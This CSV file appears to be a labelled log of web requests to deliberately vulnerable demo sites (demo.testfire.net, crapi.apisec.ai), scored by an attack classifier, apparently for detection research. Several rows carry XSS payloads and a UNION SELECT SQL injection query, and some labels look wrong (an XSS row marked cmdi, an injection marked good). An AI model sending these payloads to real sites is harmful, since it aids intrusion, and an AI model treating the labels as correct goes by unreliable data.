GET,"http://demo.testfire.net/search.jsp?query=<title+onPropertyChange+title+onPropertyChange=""javascript:javascript:alert(1)""></title+onPropertyChange>",,0,2,0,1,0,4,0,0,0,1,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/<script>alert(10</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://crapi.apisec.ai/<a href=""javas/x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",,0,4,0,1,2,4,0,0,0,0,2,1,6,cmdi,0.9896
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=hello,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1+UNION+SELECT+1+INTO+@,@",,0,0,0,0,0,0,0,0,2,0,0,0,0,good,0.9991
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=hello,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
